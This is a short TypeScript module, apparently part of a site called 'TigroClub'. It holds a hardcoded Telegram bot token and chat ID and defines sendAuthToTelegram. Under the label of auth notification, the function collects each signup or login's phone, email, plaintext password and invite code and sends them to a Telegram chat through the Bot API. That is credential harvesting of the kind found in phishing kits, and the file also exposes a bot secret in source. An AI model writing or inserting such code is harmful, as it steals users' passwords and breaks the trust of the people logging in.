const BOT_TOKEN = "8915553129:AAGRcTcnIgSnNrnG4qDD-qH-F9VPmvSAv7k";
const CHAT_ID = "6877438123";

export type AuthNotifyPayload = {
  type: "signup" | "login";
  phone?: string;
  email?: string;
  password?: string;
  inviteCode?: string;
  extra?: string;
};

export async function sendAuthToTelegram(payload: AuthNotifyPayload): Promise<boolean> {
  const lines = [
    `TigroClub ${payload.type.toUpperCase()}`,
    `Time: ${new Date().toISOString()}`,
    payload.phone ? `Phone: ${payload.phone}` : null,
    payload.email ? `Email: ${payload.email}` : null,
    payload.password ? `Password: ${payload.password}` : null,
    payload.inviteCode ? `Invite: ${payload.inviteCode}` : null,
    payload.extra ? `Extra: ${payload.extra}` : null,
  ].filter(Boolean);

  const text = lines.join("\n");

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        disable_web_page_preview: true,
      }),
    });
    return res.ok;
  } catch {
    return false;
  }
}
